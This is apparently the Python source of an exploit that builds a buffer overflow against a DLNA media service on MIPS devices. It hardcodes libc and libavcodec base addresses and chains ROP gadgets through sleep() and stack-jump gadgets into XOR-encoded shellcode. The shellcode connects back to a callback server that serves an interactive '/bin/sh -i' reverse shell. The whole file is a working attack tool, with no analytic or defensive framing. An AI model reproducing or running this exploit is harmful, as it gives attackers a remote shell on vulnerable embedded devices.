import os
import signal
import struct
from simplesploit.overflow_development.overflowbuilder import OverflowBuffer,OverflowSection,RopGadget
from simplesploit.common.support import LittleEndian
from simplesploit.servers.callback_server import Callback
from simplesploit.payloads.mips.callback_payload import CallbackPayload
from simplesploit.encoders.mips.mipsxordecoderstub import MipsXorEncoder

class DLNAOverflow(object):
    endianness=LittleEndian
    libc_qemu_base=0x4084a000
    libc_actual_base=0x2af34000
    libavcodec_qemu_base=0
    libavcodec_actual_base=0x2b0a8000

    def __build_overflow__(self,ip_address,port,encoder_class,qemu):
        libc_base=0
        libavcodec_base=0
        if qemu:
            libc_base=self.__class__.libc_qemu_base
            libavcodec_base=self.__class__.libavcodec_qemu_base
        else:
            libc_base=self.__class__.libc_actual_base
            libavcodec_base=self.__class__.libavcodec_actual_base
        reg_ra=590
        reg_s0=554
        reg_s1=558
        reg_s2=562
        reg_s3=566

        print "libc_base: %#010x" % libc_base
        overflow_sections=[]
        #placeholders one and two get added together and passed as dst into memcpy(). They must add
        #up to be a writable address."
        placeholder_1=RopGadget(self.endianness,726,0x15a3c932,"placeholder to avoid crashing memcpy.")
        placeholder_2=RopGadget(self.endianness,742,0x15a3c932,"placeholder to avoid crashign memcpy.")
        
        overflow_sections.append(placeholder_1)
        overflow_sections.append(placeholder_2)

        #load 1 into $a0, jalr $s3
        setup_arg_to_sleep=RopGadget(self.endianness,reg_ra,0x00028028,"reg $ra. set up 1 sec arg to sleep(). jalr $s3.",libc_base,warn_if_nulls=True)
        overflow_sections.append(setup_arg_to_sleep)
 

        #load stack data into $ra, jr $s1
        setup_ra=RopGadget(self.endianness,reg_s3,0x0001D95C,"reg: $s3. setup ra before sleep().",libc_base,warn_if_nulls=True)
        overflow_sections.append(setup_ra)

        #placeholder in $s2, avoid crashing setup arg to sleep.
        placeholder_3=RopGadget(self.endianness,reg_s2,0x506c0+0x7e88,"reg $s2. placeholder.",libc_base)
        overflow_sections.append(placeholder_3)

        #address of sleep
        sleep_rop=RopGadget(LittleEndian,reg_s1,0x506c0,"reg $s1. Address of sleep() in libc. be sure to set up $ra and $a0 before calling.",libc_base,warn_if_nulls=True)
        overflow_sections.append(sleep_rop)
        
        #will get loaded into $ra. Load $sp offset into $s6, jalr $s0
        stackfinder_s6_s0=RopGadget(self.endianness,630,0x71D30,"reg $ra. offset from $sp into $s6, jalr $s0.",libavcodec_base,warn_if_nulls=True)
        overflow_sections.append(stackfinder_s6_s0)

        #jalr $s6
        stackjumper_s6=RopGadget(self.endianness,618,0x00078208,"reg $s0, jalr $s6.",libavcodec_base,warn_if_nulls=True)
        overflow_sections.append(stackjumper_s6)
        payload=CallbackPayload(self.callback_server,self.endianness)
        
        if encoder_class:
            print "Encoding payload."
            encoded_payload=encoder_class(payload,self.endianness)
            payload=encoded_payload
            print "done."
        
        payload_section=OverflowSection(930,payload.shellcode,"connect-back payload")
        overflow_sections.append(payload_section)
        print("length of shellcode is %d"%len(payload.shellcode))
        buf=OverflowBuffer(2048,overflow_sections)

        return buf

    def scan_for_nulls(self):
        return self.overflow_data.scan_for_nulls()

    def chunks(self,chunklen):
        string=self.overflow_data.overflow_string
        print len(string)
        chunks=[]
        
        while len(string) > 0:
            newstring=""
            for i in range(0,chunklen):
                if len(string) <= 0:
                    break
                newstring+=string[0]
                string=string[1:]
            for k,v in self.badchars.items():
                if k in newstring:
                    print "replacing with "+v
                    newstring=newstring.replace(k,'\"||'+v+'||\"')
            
            chunks.append(newstring)
        
        return chunks
    
    def find(self,find_string):
        if find_string.startswith('0x'):
            find_string=struct.pack("<L",int(find_string,16))
        return self.overflow_data.find_offset(find_string)

    def serve_callback(self):
        self.pid=self.callback_server.serve_callback()
        print "callback server started. pid %d" % self.pid

    def wait_callback(self,kill=False):
        if self.pid:
            if(kill):
                os.kill(self.pid,signal.SIGTERM)
            os.waitpid(self.pid,0)

    def __init__(self,ip_address,port,badchars,encode=False,qemu=False):
        self.pid=None
        encoder_class=None
        if encode:
            encoder_class=MipsXorEncoder

        self.badchars=badchars
        self.callback_server=Callback(ip_address,port,startcmd="/bin/sh -i",connectback_shell=True)
        self.endianness=self.__class__.endianness
        self.overflow_data=self.__build_overflow__(ip_address,port,encoder_class,qemu)


